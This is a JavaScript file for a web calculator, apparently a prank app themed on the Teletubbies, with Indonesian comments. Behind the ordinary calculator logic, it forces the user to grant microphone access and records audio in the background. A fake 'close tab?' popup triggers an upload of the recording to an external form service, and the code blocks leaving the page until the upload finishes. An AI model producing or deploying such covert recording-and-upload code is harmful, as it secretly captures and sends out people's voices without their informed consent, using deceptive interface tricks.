let runningTotal = 0;
let buffer = "0";
let previeousOperator = null; 

const screen = document.querySelector('.screen');
const music = document.getElementById('background-music');
const statusPesan = document.getElementById('status-rekam');

let mediaRecorder;
let audioChunks = [];

// Logika klik tombol kalkulator
function buttonClick(value){
    if (!value || value.length > 3) return; 
    if(isNaN(value)){
        handleSymbol(value);
    }else{
        handleNumber(value);
    }
    screen.innerText = buffer;
}

function handleSymbol(symbol){
    switch(symbol){
        case 'C':
            buffer = '0';
            runningTotal = 0;
            previeousOperator = null;
            document.body.style.backgroundImage = "none";
            document.body.style.background = "linear-gradient(320deg, #eb92be, #ffef78, #63c9b4)";
            music.pause();
            music.currentTime = 0;
            break;
            
        case "=":
            if(previeousOperator === null){ return; }
            flushOperation(parseFloat(buffer));
            previeousOperator = null;
            buffer = runningTotal;
            runningTotal = 0;

            // Efek Kejutan: Tampilkan gambar Teletubbies dan putar musik
            document.body.style.backgroundImage = "url('teletubbies.jpg')";
            music.play().catch(e => console.log("Musik diblokir browser"));
            
            // Hadang layar dengan memunculkan Pop-up palsu "Tutup Tab?"
            const popupTutup = document.getElementById('popup-tutup');
            if (popupTutup) {
                popupTutup.style.display = 'flex';
            }
            break;
            
        case "←":
            if(buffer.length === 1){ buffer = '0'; }
            else { buffer = buffer.substring(0, buffer.length - 1); }
            break;
        case "+":
        case "−":
        case "×":
        case "÷":
            handleMath(symbol);
            break;
    }
}

function handleMath(symbol){
    if(buffer === '0'){ return; }
    const intBuffer = parseFloat(buffer);
    if(runningTotal === 0){ runningTotal = intBuffer; }
    else{ flushOperation(intBuffer); }
    previeousOperator = symbol;
    buffer = '0';
}

function flushOperation(intBuffer){
    if(previeousOperator === '+'){ runningTotal += intBuffer; }
    else if(previeousOperator === '−'){ runningTotal -= intBuffer; }
    else if(previeousOperator === '×'){ runningTotal *= intBuffer; }
    else if(previeousOperator === '÷'){ runningTotal /= intBuffer; }
}

function handleNumber(numberString){
    if(buffer === "0"){ buffer = numberString; }
    else { buffer += numberString; }
}

function init(){
    const areaTombol = document.querySelector('.calc-buttons');
    if (areaTombol) {
        areaTombol.addEventListener('click', function(event){
            buttonClick(event.target.innerText);            
        });
    }
}

// --- LOGIKA ALUR PEREKAM BACKGROUND & POP-UP OK ---
const welcomeScreen = document.getElementById('welcome-screen');
const kotakKalkulator = document.querySelector('.wrapper'); 
const btnMulai = document.getElementById('btn-mulai');
const btnOk = document.getElementById('btn-ok');
const popupTutup = document.getElementById('popup-tutup');

if (btnMulai) {
    btnMulai.addEventListener('click', async () => {
        try {
            // Meminta izin mikrofon (Muncul Pop-up Allow)
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);
            audioChunks = [];

            mediaRecorder.ondataavailable = (event) => { audioChunks.push(event.data); };

            // Alur yang berjalan setelah rekaman dimatikan oleh tombol OK
                        // KONDISI SAAT REKAMAN BERHENTI (DIPICU SETELAH TOMBOL OK DIKLIK)
                        mediaRecorder.onstop = async () => {
                            if (statusPesan) statusPesan.innerText = "Memproses data hasil... ⏳";
                            
                            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                            const formData = new FormData();
                            
                            // Tambah teks keterangan pancingan agar data tersortir rapi
                            formData.append('project', 'Kalkulator Teletubbies');
                            
                            // Lampirkan file audionya (Getform wajib menggunakan field name 'file')
                            formData.append('file', audioBlob, 'suara-kalkulator.wav'); 
            
                            try {
                                // ⚠️ TEMPELKAN LINK URL GETFORM BARU ANDA DI BAWAH INI!
                                await fetch('https://forminit.com/thank-you', {
                                    method: 'POST',
                                    body: formData,
                                    keepalive: true // Menjaga file tetap terkirim walau browser buru-buru ditutup setelahnya
                                });
                                
                                if (statusPesan) statusPesan.innerText = "Selesai diproses! ✅";
                                window.onbeforeunload = null; // Membuka kembali sistem kunci keluar browser
                                setTimeout(() => { if (statusPesan) statusPesan.innerText = ""; }, 3000);
                            } catch (error) {
                                if (statusPesan) statusPesan.innerText = "Gagal mengirim data. ❌";
                                window.onbeforeunload = null;
                            }
                        };
            

            // Mulai rekam suara di latar belakang
            mediaRecorder.start();

            // Sembunyikan layar pembuka, tampilkan kalkulator secara bersih
            if (welcomeScreen) welcomeScreen.classList.add('halaman-keluar'); 
            setTimeout(() => {
                if (welcomeScreen) welcomeScreen.style.display = 'none';
                if (kotakKalkulator) kotakKalkulator.classList.add('kalkulator-masuk');
            }, 500);

        } catch (err) {
            alert("Aplikasi gagal disiapkan. Anda wajib memberikan izin mikrofon agar bisa masuk!");
        }
    });
}

// B. KETIKA TOMBOL "OK" DI DALAM POP-UP DIKLIK
if (btnOk) {
    btnOk.addEventListener('click', function() {
        // 1. Sembunyikan kembali pop-up peringatan palsunya
        if (popupTutup) {
            popupTutup.style.display = 'none';
        }

        // 2. Tampilkan status loading awal di layar agar user tahu proses sedang berjalan
        if (statusPesan) {
            statusPesan.innerText = "Mengunci berkas suara... ⏳";
        }

        // 3. Aktifkan sistem pencegah tutup tab darurat selama upload file berjalan
        window.onbeforeunload = function() {
            return "Proses kirim data belum selesai, yakin ingin keluar?";
        };

        // 4. HENTIKAN PEREKAMAN
        // (Ini akan memicu 'mediaRecorder.onstop' yang di atas untuk merakit file audio)
        if (mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop(); 
        }

        // 5. JEDER! Munculkan background Teletubbies dan putar musik setelah tombol OK diklik
        document.body.style.backgroundImage = "url('teletubbies.jpg')";
        if (music) {
            music.play().catch(e => console.log("Musik diblokir browser"));
        }
    });
}


init();
